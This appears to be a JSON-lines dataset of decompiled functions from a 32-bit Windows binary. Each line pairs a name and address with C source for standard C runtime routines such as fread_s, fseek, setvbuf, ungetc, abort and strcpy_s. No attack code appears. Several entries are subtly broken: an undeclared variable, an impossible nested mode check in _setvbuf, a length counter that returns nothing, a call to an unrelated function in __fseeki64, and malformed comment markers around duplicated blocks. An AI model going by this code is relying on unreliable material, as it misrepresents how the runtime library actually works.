{"Function Name": "FUN_10027754", "Address": "10027754", "Source Code": "uint __cdecl FUN_10027754(undefined *destination_buffer, char *destination_pointer, uint bytes_to_read, uint blocks_to_read, FILE *file_pointer)\n{\n    int *file_flag_pointer; \n    char *remaining_bytes; \n    undefined *destination_buffer_pointer; \n    uint error_code; \n    char *current_destination_pointer; \n    \n    if ((bytes_to_read != 0) && (blocks_to_read != 0)) {\n        \n        if (destination_buffer != (undefined *)0x0) {\n            \n            if ((file_pointer != (FILE *)0x0) && (blocks_to_read <= (uint)(0xffffffff / (ulonglong)bytes_to_read))) {\n                file_flag_pointer = &file_pointer->_flag; \n                current_destination_pointer = destination_buffer; \n                remaining_bytes = (char *)(bytes_to_read * blocks_to_read); \n                do {\n                    while (true) {\n                        \n                        if (remaining_bytes == (char *)0x0) {\n                            return blocks_to_read; \n                        }\n                        \n                        if ((file_pointer->_flag & 0x4c0U) != 0) break;\n                        \n                        if (remaining_bytes < (char *)0x1000) {\n                            \n                            if (FUN_1002f475(file_pointer) == -1) goto LAB_1002791c;\n                            \n                            if (destination_pointer == (char *)0x0) goto LAB_100278f0;\n                            *current_destination_pointer = (char)bytes_read; \n                            current_destination_pointer++; \n                            remaining_bytes--; \n                        } else {\n                            char *max_count_pointer = remaining_bytes; \n                            \n                            if ((char *)0x7fffffff < remaining_bytes) {\n                                max_count_pointer = (char *)0x7fffffff;\n                            }\n                            \n                            if ((char *)file_pointer->_bufsiz != (char *)0x0) {\n                                max_count_pointer -= ((uint)max_count_pointer % (uint)file_pointer->_bufsiz);\n                            }\n                            \n                            if (destination_pointer < max_count_pointer) goto LAB_100278f0;\n                            file_pointer->_base = (char *)0x0; \n                            file_pointer->_ptr = (char *)file_pointer->_cnt; \n                            destination_buffer_pointer = current_destination_pointer; \n                            bytes_read = __fileno(file_pointer); \n                            \n                            bytes_read = __read_nolock(bytes_read, destination_buffer_pointer, (uint)max_count_pointer);\n                            \n                            if (bytes_read == 0) {\n                                error_code = 8; \n                                goto LAB_10027915;\n                            }\n                            \n                            if (bytes_read < 0) goto LAB_10027913;\n                            remaining_bytes -= bytes_read; \n                            current_destination_pointer += bytes_read; \n                        }\n                    }\n                    char *current_base_pointer = file_pointer->_base; \n                    \n                    if (current_base_pointer == (char *)0x0) goto LAB_1002784a;\n                    \n                    if ((int)current_base_pointer < 0) {\n                    LAB_10027913:\n                        error_code = 0x10; \n                    LAB_10027915:\n                        LOCK(); \n                        *file_flag_pointer |= error_code; \n                        UNLOCK(); \n                    LAB_1002791c:\n                        return (uint)((int)(char *)(bytes_to_read * blocks_to_read) - (int)remaining_bytes) / bytes_to_read; \n                    }\n                    \n                    if (remaining_bytes < current_base_pointer) {\n                        current_base_pointer = remaining_bytes;\n                    }\n                    \n                    if (destination_pointer < current_base_pointer) {\n                    LAB_100278f0:\n                        \n                        if (destination_pointer != (char *)0xffffffff) {\n                            _memset(destination_buffer, 0, (size_t)destination_pointer); \n                        }\n                        undefined4 *error_handling_pointer = (undefined4 *)FUN_100253b8(); \n                        *error_handling_pointer = 0x22; \n                        goto LAB_1002777e; \n                    }\n                    \n                    _memcpy_s(current_destination_pointer, (rsize_t)destination_pointer, file_pointer->_ptr, (rsize_t)current_base_pointer);\n                    remaining_bytes -= (int)current_base_pointer; \n                    current_destination_pointer += (int)current_base_pointer; \n                    file_pointer->_base -= (int)current_base_pointer; \n                    file_pointer->_ptr = current_base_pointer + (int)file_pointer->_ptr; \n                } while (true); \n            }\n            undefined4 *error_handling_pointer = (undefined4 *)FUN_100253b8(); \n            *error_handling_pointer = 0x16; \n        LAB_1002777e:\n            FUN_1001de96(); \n        }\n    }\n    return 0; \n}"}
{"Function Name": "_fread", "Address": "1002792e", "Source Code": "size_t __cdecl _fread(void *destinationBuffer, size_t elementSize, size_t count, FILE *file)\n{\n    \n    return _fread_s(destinationBuffer, 0xffffffff, elementSize, count, file);\n}"}
{"Function Name": "_fread_s", "Address": "1002794b", "Source Code": "size_t __cdecl _fread_s(void *destinationBuffer, size_t destinationSize, size_t elementSize, size_t elementCount, FILE *filePointer)\n{\n    uint readResult; \n    \n    if ((elementSize != 0) && (elementCount != 0)) {\n        \n        if (filePointer != (FILE *)0x0) {\n            __lock_file(filePointer); \n            \n            readResult = FUN_10027754((undefined *)destinationBuffer, (char *)destinationSize, elementSize, elementCount, filePointer);\n            FUN_100279d6(); \n            return readResult; \n        }\n        \n        if (destinationSize != 0xffffffff) {\n            _memset(destinationBuffer, 0, destinationSize); \n        }\n        FUN_1001de96(); \n    }\n    return 0; \n}"}
{"Function Name": "_fsetpos", "Address": "100279de", "Source Code": "int __cdecl _fsetpos(FILE *file_pointer, fpos_t *position_pointer)\n{\n    \n    if (file_pointer != (FILE *)0x0 && position_pointer != (fpos_t *)0x0) {\n        \n        return __fseeki64(file_pointer, (ulonglong)*(uint *)((int)position_pointer + 4), 0);\n    }\n    \n    *(undefined4 *)FUN_100253b8() = 0x16;\n    \n    FUN_1001de96();\n    \n    return -1;\n}"}
{"Function Name": "LongLongSub", "Address": "10027a19", "Source Code": "long __cdecl LongLongSub(__int64 minuend, __int64 subtrahend, __int64 *result)\n{\n    \n    longlong difference = minuend - subtrahend;\n    \n    int isMinuendNegative = (0xffffffff < minuend) || (minuend > -1) ? 0 : 1;\n    \n    int isSubtrahendNegative = (0xffffffff < subtrahend) || (subtrahend > -1) ? 0 : 1;\n    \n    if (isMinuendNegative != isSubtrahendNegative) {\n        \n        if ((0 < (int)((ulonglong)difference >> 0x20)) || (-1 < difference)) {\n            \n            *(undefined4 *)result = 0xffffffff;\n            *(undefined4 *)((int)result + 4) = 0xffffffff;\n            \n            return -0x7ff8fdea;\n        }\n    }\n    \n    *result = difference;\n    \n    return 0;\n}"}
{"Function Name": "common_fseek", "Address": "10027a9a", "Source Code": "undefined4 __cdecl common_fseek(FILE *file_pointer, int *offset, int whence, int seek_origin)\n{\n    undefined4 result;\n    \n    if ((file_pointer == (FILE *)0x0) || (((seek_origin != 0 && (seek_origin != 1)) && (seek_origin != 2)))) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        \n        FUN_1001de96();\n        \n        result = 0xffffffff;\n    }\n    else {\n        \n        __lock_file(file_pointer);\n        \n        result = common_fseek_nolock(file_pointer, offset, whence, seek_origin);\n        \n        FUN_10027b17();\n    }\n    \n    return result;\n}"}
{"Function Name": "FUN_10027b21", "Address": "10027b21", "Source Code": "uint __cdecl FUN_10027b21(int *data_array_1, int *data_array_2, int value_1, int value_2)\n{\n    uint file_handle; \n    longlong seek_result;   \n    \n    if (((value_2 == 2) || ((data_array_1[3] & 0x4c0) == 0)) || ((data_array_1[3] & 6) != 0)) {\n        return data_array_1[3] & 0xffffff00; \n    }\n    \n    if (0 < data_array_1[2]) {\n        file_handle = data_array_1[4]; \n        \n        if (((*(byte *)((&DAT_10050088)[(int)file_handle >> 6] + 0x28 + ((file_handle & 0x3f) * 0x30)) & 0x80) == 0) &&\n            (*(char *)((&DAT_10050088)[(int)file_handle >> 6] + 0x29 + ((file_handle & 0x3f) * 0x30)) == '\\0')) {\n            \n            \n            if (value_2 == 0) {\n                seek_result = __lseeki64_nolock(file_handle, 0x100000000, 0); \n                \n                if (((seek_result < 0x100000000) && (seek_result < 0)) || ((int)LongLongSub(CONCAT44(value_1, data_array_2), seek_result - data_array_1[2], (__int64 *)&data_array_2) < 0)) {\n                    return (uint)0 & 0xffffff00; \n                }\n            }\n            \n            if (((int)(data_array_1[1] - *data_array_1) >> 0x1f <= value_1) &&\n                (((int)(data_array_1[1] - *data_array_1) >> 0x1f < value_1) || (data_array_1[1] - *data_array_1 <= data_array_2))) {\n                \n                \n                if ((value_1 <= (int)data_array_1[2] >> 0x1f) &&\n                    ((value_1 < (int)data_array_1[2] >> 0x1f) || (data_array_2 <= data_array_1[2]))) {\n                    \n                    *data_array_1 += (int)data_array_2; \n                    data_array_1[2] -= (int)data_array_2; \n                    return CONCAT31((int3)((uint)data_array_1[2] >> 8), 1); \n                }\n            }\n        }\n    }\n    return (uint)0 & 0xffffff00; \n}"}
{"Function Name": "common_fseek_nolock", "Address": "10027bfa", "Source Code": "undefined4 __cdecl common_fseek_nolock(FILE *file_stream,int *seek_position,int offset,int adjust_flag)\n{\n    uint result; \n    longlong combined_seek_position; \n    \n    if (((uint)file_stream->_flag >> 0xd & 1) == 0) {\n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8(); \n        *error_code_pointer = 0x16; \n        return 0xffffffff; \n    }\n    \n    LOCK(); \n    file_stream->_flag = file_stream->_flag & 0xfffffff7; \n    UNLOCK(); \n    \n    combined_seek_position = CONCAT44(offset,seek_position);\n    \n    \n    result = FUN_10027b21((int *)file_stream,seek_position,offset,adjust_flag);\n    \n    \n    if ((char)result == '\\0') {\n        \n        if (adjust_flag == 1) {\n            combined_seek_position += FUN_1002fa39(file_stream); \n            adjust_flag = 0; \n        }\n        \n        \n        ___acrt_stdio_flush_nolock(file_stream);\n        file_stream->_base = (char *)0x0; \n        file_stream->_ptr = (char *)file_stream->_cnt; \n       \n        \n        if (((uint)file_stream->_flag >> 2 & 1) == 0) {\n            \n            if ((((byte)file_stream->_flag & 0x41) == 0x41) && (((uint)file_stream->_flag >> 8 & 1) == 0)) {\n                file_stream->_bufsiz = 0x200; \n            }\n        } else {\n            LOCK(); \n            file_stream->_flag = file_stream->_flag & 0xfffffffc; \n            UNLOCK(); \n        }\n        \n        \n        combined_seek_position = __lseeki64_nolock(file_stream->_file, CONCAT44(adjust_flag, (int)((ulonglong)combined_seek_position >> 0x20)), unaff_EDI);\n        \n        \n        if (combined_seek_position == -1) {\n            return 0xffffffff; \n        }\n    }\n    \n    return 0; \n}"}
{"Function Name": "__fseeki64", "Address": "10027cd3", "Source Code": "int __cdecl __fseeki64(FILE *fileStream, longlong offsetValue, int origin)\n{\n    \n    \n    \n    \n    \n    return setFilePosition(fileStream, NULL, (int)offsetValue, offsetValue._4_4_);\n}"}
{"Function Name": "__acrt_lock_stream_and_call<class_<lambda_b51c0495177f500e782686251704ae76>_>", "Address": "10027d3f", "Source Code": "\\*\nuint __cdecl\n__acrt_lock_stream_and_call<class_<lambda_b51c0495177f500e782686251704ae76>_>\n(_iobuf *param_1,<lambda_b51c0495177f500e782686251704ae76> *param_2)\n{\n    \n    __crt_seh_guarded_call<unsigned_int> local_5;\n    \n    return __crt_seh_guarded_call<unsigned_int>::\n        operator()<class_<lambda_11b4f7b0d3157825a5656a18eba1ae27>,class_<lambda_b51c0495177f500e782686251704ae76>&,class_<lambda_cf89b47920b5017557bfe891e78aca36>_>\n        (&local_5, \n        (<lambda_11b4f7b0d3157825a5656a18eba1ae27> *)&param_1, \n        param_2, \n        (<lambda_cf89b47920b5017557bfe891e78aca36> *)&param_1); \n}\n*\\ \n \nuint __cdecl\n__acrt_lock_stream_and_call<class_<lambda_b51c0495177f500e782686251704ae76>_>\n(_iobuf *param_1,<lambda_b51c0495177f500e782686251704ae76> *param_2)\n{\n    __crt_seh_guarded_call<unsigned_int> local_5;\n    return __crt_seh_guarded_call<unsigned_int>::\n        operator()<class_<lambda_11b4f7b0d3157825a5656a18eba1ae27>,class_<lambda_b51c0495177f500e782686251704ae76>&,class_<lambda_cf89b47920b5017557bfe891e78aca36>_>\n        (&local_5,(<lambda_11b4f7b0d3157825a5656a18eba1ae27> *)&param_1,param_2,\n        (<lambda_cf89b47920b5017557bfe891e78aca36> *)&param_1);\n}"}
{"Function Name": "FUN_10027dad", "Address": "10027dad", "Source Code": "uint __cdecl FUN_10027dad(undefined8 *data_pointer_increment, uint item_size, uint item_count, FILE *file_pointer)\n{\n    int *file_flag_pointer; \n    char *base_pointer; \n    int return_value; \n    char *buffer_size; \n    \n    if ((item_size != 0) && (item_count != 0)) {\n        \n        if ((file_pointer != (FILE *)0x0) && (data_pointer_increment != (undefined8 *)0x0 && (item_count <= (uint)(0xffffffff / (ulonglong)item_size))))) {\n            file_flag_pointer = &file_pointer->_flag; \n            \n            buffer_size = (char *)(((*file_flag_pointer & 0x4c0U) == 0) ? 0x1000 : file_pointer->_bufsiz);\n            char *total_size_to_write = (char *)(item_size * item_count); \n            \n            do {\n                while (true) {\n                    \n                    if (total_size_to_write == (char *)0x0) {\n                        return item_count; \n                    }\n                    \n                    if ((file_pointer->_flag & 0xc0U) != 0) break;\n                    \n                    if (buffer_size <= total_size_to_write) {\n                        \n                        if (((file_pointer->_flag & 0xc0U) != 0) && (return_value = ___acrt_stdio_flush_nolock(file_pointer), return_value != 0)) {\n                            return (uint)((int)(char *)(item_size * item_count) - (int)total_size_to_write) / item_size; \n                        }\n                        char *write_pointer = total_size_to_write; \n                        \n                        if (buffer_size != (char *)0x0) {\n                            write_pointer = total_size_to_write - ((uint)total_size_to_write % (uint)buffer_size);\n                        }\n                        \n                        if ((char *)0xfffffffd < write_pointer) {\n                            write_pointer = (char *)0xfffffffe;\n                        }\n                        undefined8 *data_to_write_pointer = data_pointer_increment; \n                        base_pointer = write_pointer; \n                        return_value = __fileno(file_pointer); \n                        char *write_result_pointer = (char *)__write(return_value, data_to_write_pointer, (uint)base_pointer); \n                        \n                        if (write_result_pointer != (char *)0xffffffff) {\n                            base_pointer = (write_result_pointer <= write_pointer) ? write_result_pointer : write_pointer; \n                            total_size_to_write = total_size_to_write - (int)base_pointer; \n                            \n                            if (write_pointer <= write_result_pointer) {\n                                data_pointer_increment = (undefined8 *)((int)data_pointer_increment + (int)base_pointer);\n                                continue; \n                            }\n                        }\n                        return (uint)((int)(char *)(item_size * item_count) - (int)total_size_to_write) / item_size; \n                    }\n                    \n                    return_value = FUN_1002fc21(*(byte *)data_pointer_increment, file_pointer);\n                    if (return_value == -1) {\n                        return (uint)((int)(char *)(item_size * item_count) - (int)total_size_to_write) / item_size; \n                    }\n                    buffer_size = (char *)file_pointer->_bufsiz; \n                    data_pointer_increment = (undefined8 *)((int)data_pointer_increment + 1); \n                    total_size_to_write = total_size_to_write - 1; \n                    \n                    if ((int)buffer_size < 1) {\n                        buffer_size = (char *)0x1;\n                    }\n                }\n                base_pointer = file_pointer->_base; \n                if (base_pointer == (char *)0x0) continue; \n                \n                if ((int)base_pointer < 0) {\n                    LOCK(); \n                    *file_flag_pointer = *file_flag_pointer | 0x10; \n                    UNLOCK(); \n                    return (uint)((int)(char *)(item_size * item_count) - (int)total_size_to_write) / item_size; \n                }\n                \n                if (total_size_to_write < base_pointer) {\n                    base_pointer = total_size_to_write;\n                }\n                \n                FUN_10018670((undefined8 *)file_pointer->_ptr, data_pointer_increment, (uint)base_pointer);\n                file_pointer->_base = file_pointer->_base - (int)base_pointer; \n                total_size_to_write = total_size_to_write - (int)base_pointer; \n                file_pointer->_ptr = base_pointer + (int)file_pointer->_ptr; \n                data_pointer_increment = (undefined8 *)((int)data_pointer_increment + (int)base_pointer); \n            } while (true);\n        }\n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8(); \n        *error_code_pointer = 0x16; \n        FUN_1001de96(); \n    }\n    return 0; \n}"}
{"Function Name": "__acrt_lock_stream_and_call<class_<lambda_b721fa326cdb32351d23dfa67958c160>_>", "Address": "10027fcf", "Source Code": "\\*\nint __cdecl\n__acrt_lock_stream_and_call<class_<lambda_b721fa326cdb32351d23dfa67958c160>_>\n(_iobuf *param_1,<lambda_b721fa326cdb32351_d23dfa67958c160> *param_2)\n{\n    \n    __crt_seh_guarded_call<int> local_5;\n    \n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_d92cfe8357b99225085016881b624cb0>,class_<lambda_b721fa326cdb32351_d23dfa67958c160>&,class_<lambda_42d75b0848218ec137fa420c8ba9fdf9>_>\n        (&local_5, param_1, param_2, param_1); \n}\n*\\ \n \nint __cdecl\n__acrt_lock_stream_and_call<class_<lambda_b721fa326cdb32351d23dfa67958c160>_>\n(_iobuf *param_1,<lambda_b721fa326cdb32351_d23dfa67958c160> *param_2)\n{\n    __crt_seh_guarded_call<int> local_5;\n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_d92cfe8357b99225085016881b624cb0>,class_<lambda_b721fa326cdb32351d23dfa67958c160>&,class_<lambda_42d75b0848218ec137fa420c8ba9fdf9>_>\n        (&local_5, param_1, param_2, param_1);\n}"}
{"Function Name": "set_buffer", "Address": "10028091", "Source Code": "undefined4 __cdecl\nset_buffer(undefined4 *param_1, undefined4 param_2, undefined4 param_3, uint param_4)\n{\n    LOCK(); \n    param_1[3] |= param_4; \n    UNLOCK(); \n    param_1[6] = param_3; \n    *param_1 = param_2; \n    param_1[1] = param_2; \n    param_1[2] = 0; \n    return 0; \n}"}
{"Function Name": "_setvbuf", "Address": "100280c4", "Source Code": "int __cdecl _setvbuf(FILE *filePointer, char *buffer, int mode, size_t size)\n{\n    int returnValue; \n    if (filePointer == (FILE *)0x0) { \n        undefined4 *errorPointer = (undefined4 *)FUN_100253b8(); \n        *errorPointer = 0x16; \n        FUN_1001de96(); \n        returnValue = -1; \n    } else {\n        if (mode == 4) { \n            if ((mode == 0) || (mode == 0x40)) { \n                if (0x7ffffffd < size - 2) { \n                    undefined4 *errorPointer = (undefined4 *)FUN_100253b8(); \n                    *errorPointer = 0x16; \n                    FUN_1001de96(); \n                    returnValue = -1; \n                } else {\n                    \n                    returnValue = __acrt_lock_stream_and_call<class_<lambda_b721fa326cdb32351d23dfa67958c160>_>\n                    (filePointer, (<lambda_b721fa326cdb32351d23dfa67958c160> *)&size);\n                }\n            } else {\n                undefined4 *errorPointer = (undefined4 *)FUN_100253b8(); \n                *errorPointer = 0x16; \n                FUN_1001de96(); \n                returnValue = -1; \n            }\n        } else {\n            if (mode != 0 && mode != 0x40) { \n                undefined4 *errorPointer = (undefined4 *)FUN_100253b8(); \n                *errorPointer = 0x16; \n                FUN_1001de96(); \n                returnValue = -1; \n            } else {\n                if (0x7ffffffd < size - 2) { \n                    undefined4 *errorPointer = (undefined4 *)FUN_100253b8(); \n                    *errorPointer = 0x16; \n                    FUN_1001de96(); \n                    returnValue = -1; \n                } else {\n                    \n                    returnValue = __acrt_lock_stream_and_call<class_<lambda_b721fa326cdb32351d23dfa67958c160>_>\n                    (filePointer, (<lambda_b721fa326cdb32351d23dfa67958c160> *)&size);\n                }\n            }\n        }\n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_1002813a", "Address": "1002813a", "Source Code": "uint __cdecl FUN_1002813a(uint input_value, FILE *file_pointer)\n{\n    uint file_descriptor; \n    undefined *file_data_pointer; \n    undefined4 *error_pointer; \n    int *file_flag_pointer; \n    \n    if (((uint)file_pointer->_flag >> 0xc & 1) == 0) {\n        file_descriptor = __fileno(file_pointer); \n        \n        if ((file_descriptor == 0xffffffff) || (file_descriptor == 0xfffffffe)) {\n            file_data_pointer = &DAT_1004e2b8; \n        } else {\n            \n            file_data_pointer = (undefined *)((file_descriptor & 0x3f) * 0x30 + (&DAT_10050088)[(int)file_descriptor >> 6]);\n        }\n        \n        if (file_data_pointer[0x29] != '\\0') {\n            error_pointer = (undefined4 *)FUN_100253b8(); \n            *error_pointer = 0x16; \n            FUN_1001de96(); \n            return 0xffffffff; \n        }\n        \n        if ((file_descriptor != 0xffffffff) && (file_descriptor != 0xfffffffe)) {\n            \n            if ((file_data_pointer[0x2d] & 1) != 0) {\n                error_pointer = (undefined4 *)FUN_100253b8(); \n                *error_pointer = 0x16; \n                FUN_1001de96(); \n                return 0xffffffff; \n            }\n        }\n    }\n    \n    if ((input_value == 0xffffffff) || (((file_pointer->_flag & 1U) == 0 && (((byte)file_pointer->_flag & 6) != 6)))) {\n        return 0xffffffff; \n    } else {\n        \n        if (file_pointer->_cnt == 0) {\n            ___acrt_stdio_allocate_buffer_nolock(&file_pointer->_ptr); \n        }\n        file_flag_pointer = &file_pointer->_flag; \n        \n        if (file_pointer->_ptr == (char *)file_pointer->_cnt) {\n            \n            if (file_pointer->_base == (char *)0x0) {\n                return 0xffffffff; \n            }\n            file_pointer->_ptr = file_pointer->_ptr + 1; \n        }\n        file_pointer->_ptr = file_pointer->_ptr - 1; \n        \n        if (((uint)*file_flag_pointer >> 0xc & 1) == 0) {\n            *file_pointer->_ptr = (char)input_value; \n        } else if (*file_pointer->_ptr != (char)input_value) {\n            file_pointer->_ptr = file_pointer->_ptr + 1; \n            return 0xffffffff; \n        }\n        file_pointer->_base = file_pointer->_base + 1; \n        LOCK(); \n        *file_flag_pointer = *file_flag_pointer & 0xfffffff7; \n        UNLOCK(); \n        LOCK(); \n        *file_flag_pointer = *file_flag_pointer | 1; \n        UNLOCK(); \n        return input_value & 0xff; \n    }\n}"}
{"Function Name": "_abort", "Address": "10028529", "Source Code": "void __cdecl _abort(void)\n{\n    \n    if (get_sigabrt_handler() != 0) {\n        \n        raise_signal(0x16);\n    }\n    \n    \n    if ((flag_variable & 2) != 0 && is_processor_feature_present(0x17)) {\n        \n        ((code *)system_interrupt(0x29))();\n    }\n    \n    \n    call_report_fault(3, 0x40000015, 1);\n    \n    \n    exit_program(3);\n}"}
{"Function Name": "___strncnt", "Address": "1002856c", "Source Code": "void __cdecl ___strncnt(char *input_string, int max_count)\n{\n    int char_count = 0; \n    \n    while (input_string[char_count] != '\\0' && char_count != max_count) {\n        char_count++; \n    }\n    \n    return; \n}"}
{"Function Name": "internal_isupper_l", "Address": "100286d2", "Source Code": "bool __cdecl internal_isupper_l(int character, __crt_locale_pointers *locale_ptr)\n{\n    \n    \n    \n    return __ischartype_l(character, 1, (_locale_t)locale_ptr) != 0; \n}"}
{"Function Name": "FUN_10028860", "Address": "10028860", "Source Code": "uint __cdecl FUN_10028860(short *param_1,uint param_2)\n{\nundefined (*pauVar1) [32];\nshort *psVar2;\nundefined auVar3 [32];\nuint uVar4;\nundefined (*pauVar5) [32];\nshort *psVar6;\nint iVar7;\nuint uVar8;\nundefined auVar9 [16];\nundefined in_ZMM1 [64];\nundefined auVar10 [64];\npsVar6 = param_1;\nif (DAT_1004f950 < 5) {\nif (DAT_1004f950 < 1) {\nif (param_1 != param_1 + param_2) {\ndo {\nif (*psVar6 == 0) break;\npsVar6 = psVar6 + 1;\n} while (psVar6 != param_1 + param_2);\n}\n}\nelse {\nif (((uint)param_1 & 1) == 0) {\nuVar8 = (-(uint)(((uint)param_1 & 0xf) != 0) & 0x10 - ((uint)param_1 & 0xf)) >> 1;\nif (param_2 < uVar8) {\nuVar8 = param_2;\n}\nif (param_1 != param_1 + uVar8) {\ndo {\nif (*psVar6 == 0) break;\npsVar6 = psVar6 + 1;\n} while (psVar6 != param_1 + uVar8);\n}\nuVar4 = (int)psVar6 - (int)param_1 >> 1;\nif (uVar4 != uVar8) {\nreturn uVar4;\n}\npsVar6 = param_1 + uVar4;\nauVar10 = ZEXT4864(in_ZMM1._16_48_) << 0x80;\npsVar2 = psVar6 + ((param_2 - uVar8) - (param_2 - uVar8 & 0xf));\nfor (; psVar6 != psVar2; psVar6 = psVar6 + 8) {\nauVar9._0_2_ = -(ushort)(*psVar6 == 0);\nauVar9._2_2_ = -(ushort)(psVar6[1] == 0);\nauVar9._4_2_ = -(ushort)(psVar6[2] == 0);\nauVar9._6_2_ = -(ushort)(psVar6[3] == 0);\nauVar9._8_2_ = -(ushort)(psVar6[4] == auVar10._8_2_);\nauVar9._10_2_ = -(ushort)(psVar6[5] == auVar10._10_2_);\nauVar9._12_2_ = -(ushort)(psVar6[6] == auVar10._12_2_);\nauVar9._14_2_ = -(ushort)(psVar6[7] == auVar10._14_2_);\nif ((ushort)((ushort)(SUB161(auVar9 >> 7,0) & 1) |\n(ushort)(SUB161(auVar9 >> 0xf,0) & 1) << 1 |\n(ushort)(SUB161(auVar9 >> 0x17,0) & 1) << 2 |\n(ushort)(SUB161(auVar9 >> 0x1f,0) & 1) << 3 |\n(ushort)(SUB161(auVar9 >> 0x27,0) & 1) << 4 |\n(ushort)(SUB161(auVar9 >> 0x2f,0) & 1) << 5 |\n(ushort)(SUB161(auVar9 >> 0x37,0) & 1) << 6 |\n(ushort)(SUB161(auVar9 >> 0x3f,0) & 1) << 7 |\n(ushort)(SUB161(auVar9 >> 0x47,0) & 1) << 8 |\n(ushort)(SUB161(auVar9 >> 0x4f,0) & 1) << 9 |\n(ushort)(SUB161(auVar9 >> 0x57,0) & 1) << 10 |\n(ushort)(SUB161(auVar9 >> 0x5f,0) & 1) << 0xb |\n(ushort)(SUB161(auVar9 >> 0x67,0) & 1) << 0xc |\n(ushort)(SUB161(auVar9 >> 0x6f,0) & 1) << 0xd |\n(ushort)((byte)(auVar9._14_2_ >> 7) & 1) << 0xe | auVar9._14_2_ & 0x8000) !=\n0) break;\n}\nfor (; (psVar6 != param_1 + param_2 && (*psVar6 != 0)); psVar6 = psVar6 + 1) {\n}\niVar7 = (int)psVar6 - (int)param_1;\ngoto LAB_10028a0d;\n}\nif (param_1 != param_1 + param_2) {\ndo {\nif (*psVar6 == 0) break;\npsVar6 = psVar6 + 1;\n} while (psVar6 != param_1 + param_2);\n}\n}\n}\nelse {\nif (((uint)param_1 & 1) == 0) {\nuVar8 = (-(uint)(((uint)param_1 & 0x1f) != 0) & 0x20 - ((uint)param_1 & 0x1f)) >> 1;\nif (param_2 < uVar8) {\nuVar8 = param_2;\n}\nif (param_1 != param_1 + uVar8) {\ndo {\nif (*psVar6 == 0) break;\npsVar6 = psVar6 + 1;\n} while (psVar6 != param_1 + uVar8);\n}\nuVar4 = (int)psVar6 - (int)param_1 >> 1;\nif (uVar4 != uVar8) {\nreturn uVar4;\n}\npauVar5 = (undefined (*) [32])(param_1 + uVar4);\npauVar1 = (undefined (*) [32])\n((int)pauVar5 + ((param_2 - uVar8) - (param_2 - uVar8 & 0x1f)) * 2);\nwhile ((pauVar5 != pauVar1 &&\n(auVar3 = vpcmpeqw_avx2(ZEXT832(0) << 0x40,*pauVar5),\n((uint)(SUB321(auVar3 >> 7,0) & 1) | (uint)(SUB321(auVar3 >> 0xf,0) & 1) << 1 |\n(uint)(SUB321(auVar3 >> 0x17,0) & 1) << 2 | (uint)(SUB321(auVar3 >> 0x1f,0) & 1) << 3\n| (uint)(SUB321(auVar3 >> 0x27,0) & 1) << 4 |\n(uint)(SUB321(auVar3 >> 0x2f,0) & 1) << 5 | (uint)(SUB321(auVar3 >> 0x37,0) & 1) << 6\n| (uint)(SUB321(auVar3 >> 0x3f,0) & 1) << 7 |\n(uint)(SUB321(auVar3 >> 0x47,0) & 1) << 8 | (uint)(SUB321(auVar3 >> 0x4f,0) & 1) << 9\n| (uint)(SUB321(auVar3 >> 0x57,0) & 1) << 10 |\n(uint)(SUB321(auVar3 >> 0x5f,0) & 1) << 0xb |\n(uint)(SUB321(auVar3 >> 0x67,0) & 1) << 0xc |\n(uint)(SUB321(auVar3 >> 0x6f,0) & 1) << 0xd |\n(uint)(SUB321(auVar3 >> 0x77,0) & 1) << 0xe | (uint)SUB321(auVar3 >> 0x7f,0) << 0xf |\n(uint)(SUB321(auVar3 >> 0x87,0) & 1) << 0x10 |\n(uint)(SUB321(auVar3 >> 0x8f,0) & 1) << 0x11 |\n(uint)(SUB321(auVar3 >> 0x97,0) & 1) << 0x12 |\n(uint)(SUB321(auVar3 >> 0x9f,0) & 1) << 0x13 |\n(uint)(SUB321(auVar3 >> 0xa7,0) & 1) << 0x14 |\n(uint)(SUB321(auVar3 >> 0xaf,0) & 1) << 0x15 |\n(uint)(SUB321(auVar3 >> 0xb7,0) & 1) << 0x16 | (uint)SUB321(auVar3 >> 0xbf,0) << 0x17\n| (uint)(SUB321(auVar3 >> 199,0) & 1) << 0x18 |\n(uint)(SUB321(auVar3 >> 0xcf,0) & 1) << 0x19 |\n(uint)(SUB321(auVar3 >> 0xd7,0) & 1) << 0x1a |\n(uint)(SUB321(auVar3 >> 0xdf,0) & 1) << 0x1b |\n(uint)(SUB321(auVar3 >> 0xe7,0) & 1) << 0x1c |\n(uint)(SUB321(auVar3 >> 0xef,0) & 1) << 0x1d |\n(uint)(SUB321(auVar3 >> 0xf7,0) & 1) << 0x1e | (uint)(byte)(auVar3[0x1f] >> 7) << 0x1f\n) == 0))) {\npauVar5 = pauVar5 + 1;\n}\nfor (; (pauVar5 != (undefined (*) [32])(param_1 + param_2) && (*(short *)*pauVar5 != 0));\npauVar5 = (undefined (*) [32])(*pauVar5 + 2)) {\n}\nreturn (int)pauVar5 - (int)param_1 >> 1;\n}\nif (param_1 != param_1 + param_2) {\ndo {\nif (*psVar6 == 0) break;\npsVar6 = psVar6 + 1;\n} while (psVar6 != param_1 + param_2);\n}\n}\niVar7 = (int)psVar6 - (int)param_1;\nLAB_10028a0d:\nreturn iVar7 >> 1;\n}\nLocal Variable: local_8 : undefined4"}
{"Function Name": "_strcpy_s", "Address": "10028a17", "Source Code": "errno_t __cdecl _strcpy_s(char *destination, rsize_t size_in_bytes, char *source)\n{\n    char current_char; \n    errno_t error_code; \n    \n    if ((destination != (char *)0x0) && (size_in_bytes != 0)) {\n        \n        if (source != (char *)0x0) {\n            do {\n                current_char = *source; \n                *destination = current_char; \n                destination++; \n                source++; \n                if (current_char == '\\0') break; \n                size_in_bytes--; \n            } while (size_in_bytes != 0); \n            if (size_in_bytes != 0) {\n                return 0; \n            }\n            *destination = '\\0'; \n            error_code = 0x22; \n            goto LAB_10028a3c; \n        }\n        *destination = '\\0'; \n    }\n    error_code = 0x16; \nLAB_10028a3c:\n    *(errno_t *)FUN_100253b8() = error_code; \n    FUN_1001de96(); \n    return error_code; \n}"}
